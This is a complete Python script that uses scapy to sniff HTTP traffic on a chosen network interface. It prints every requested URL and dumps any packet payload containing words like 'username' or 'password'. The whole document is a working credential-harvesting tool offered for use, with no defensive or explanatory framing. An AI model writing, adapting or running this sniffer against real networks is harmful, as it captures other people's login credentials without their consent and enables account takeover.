#!/usr/bin/env python

import argparse
import scapy.all as scapy
from scapy.layers import http

def getting_input_from_user():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface', help='[-]Interface for sniffing')
    option = parser.parse_args()
    if not option.interface:
        parser.error('[!]Please provide an interface for sniffing')
    else:
        return option.interface

def sniffing(interface):
    scapy.sniff(iface=interface, store=False, prn=callback_when_received_packet)

def getting_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in str(load):
                return load

def callback_when_received_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #urls
        print(f"{packet[http.HTTPRequest].Host}{packet[http.HTTPRequest].Path}")
        user_login_info = getting_login_info(packet)
        if user_login_info:
            print(user_login_info)

interface = getting_input_from_user()
sniffing(interface)
